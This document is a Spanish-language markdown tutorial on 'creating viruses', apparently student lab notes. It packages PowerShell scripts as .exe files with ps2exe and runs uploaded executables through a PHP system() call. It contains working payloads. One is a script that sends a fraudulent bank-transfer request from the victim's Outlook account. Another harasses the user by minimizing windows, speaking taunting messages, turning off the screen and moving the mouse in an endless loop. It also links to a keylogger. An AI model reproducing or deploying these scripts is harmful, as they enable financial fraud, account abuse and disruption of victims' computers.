# CREACIÓN DE VIRUS (VERSIÓN .EXE)
<p align="center">
<img src="https://media.giphy.com/media/115BJle6N2Av0A/giphy.gif" />
</p>
Vamos a crear con powershell script que posteriormente convertiremos en archivos ejecutables (.exe). Para ello usaremos WIN-PS2EXE (Modo Gráfico)

Instalaremos con powershell el modulo (modo administrador)
```powershell
Install-Module -Name ps2exe
```
Posteriormente abriremos el programa de forma gráfica.
```powershell
win-ps2exe
```
Para crear el .exe solo tenemos que introducir la ruta del script .ps1 en SOURCE FILE y la ruta + el nombre del archivo (incluyendo la extension .exe) en Target file.
<br/>
<p align="center">
<a href="https://i.stack.imgur.com/iZ9es.png"><img src="https://i.stack.imgur.com/iZ9es.png" /></a>
</p>
<br/>

Para mas dudas con la instalación visita.
 [TUTORIAL](https://www.optimizationcore.com/scripting/powershell-ps1-to-exe-converter-ps2exe-markus-scholtes/)
## MODUS OPERANDI
Para crear el laboratorio, trabajaremos con localhost en xampp y vamos a crear un **formulario** al cual subiremos los ejecutables que se guardarán en una carpeta **Upload** (propiedad de la victima) donde posteriormente ejecutaremos.
Para ello crearemos un PHP dentro de htdocs con lo siguiente:
```powershell
<?php
system(".\\uploads\\hola.exe");
?>
```

Aqui podemos ver como crearlo [Formulario y carpeta upload](https://github.com/PabloQueipo/IAW/blob/cf923c250a9a52f6598e0b01b7d996cb9978ef58/2020_11_27.md)

------------------------------

## CASOS VARIOS
<p align="center">
<a href="https://www.campusciberseguridad.com/media/k2/items/cache/9267284e7733f4bec00d2e114d3f3ba1_XL.jpg"><img src="https://www.campusciberseguridad.com/media/k2/items/cache/9267284e7733f4bec00d2e114d3f3ba1_XL.jpg" /></a>
</p>

### PHISHING
Haciendo una investigación previa se consiguen correos electronicos de personal de la empresa y desde la cuenta de la víctima mandaremos un correo a otro compañero pidiendo un ingreso en una cuenta bancaria.

```powershell
$Outlook = New-Object -ComObject Outlook.Application
$Mail = $Outlook.CreateItem(0)
$Mail.To = "keipo20@gmail.com"
$Mail.Subject = "URGENTE"
$Mail.Body ="Buenos días, haz un ingreso de 100 € a la Cuenta Bancaria siguiente: xx xxxx xx xxxx xxxxxxxxxxx"
$Mail.Send()
```

### MOLESTAR
Ejecutable con la siguiente secuencia:
1. Minimizar todas las pantallas.
2. Voz con mensaje
3. Gif que habremos introducido junto con el .exe
4. Voz con mensaje y posterior apagar pantalla
5. Bucle que mueve el ratón.

<p align="center">
<img src="https://media.giphy.com/media/eaECZB7V6GACc/giphy.gif"/>
</p>


```powershell
(New-Object -ComObject Shell.Application).MinimizeAll()
(New-Object -com SAPI.SpVoice).speak("Acabo de entrar en tu ordenador")
Start-Process ".\\uploads\\hacker.gif"

Start-Sleep 1
(New-Object -com SAPI.SpVoice).speak("TE VOY A APAGAR LA PANTALLA")

$code = @"
using System;
using System.Runtime.InteropServices;
public class API
{
    [DllImport("user32.dll")]
    public static extern
    int SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
}
"@
$t = Add-Type -TypeDefinition $code -PassThru
$t::SendMessage(0xffff, 0x0112, 0xf170, 2)

for(1)
{
    Start-Sleep -Seconds 1
    $xa = [System.Windows.Forms.Cursor]::Position.X
    $ya = [System.Windows.Forms.Cursor]::Position.y
    Write-Host $xa $ya
    Start-Sleep -Seconds 1
    [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($xa+50),($ya+50))
    $xa = [System.Windows.Forms.Cursor]::Position.X
    $ya = [System.Windows.Forms.Cursor]::Position.y
    Write-Host $xa $ya
}
```




### CREACIÓN DE KEYLOGGER (PYTHON)
[Pablo Queipo Keylogger](https://github.com/PabloQueipo/SAD/blob/83925cc70ef76fc94868dacb8c112919c6221c53/2020_11_09.md9)
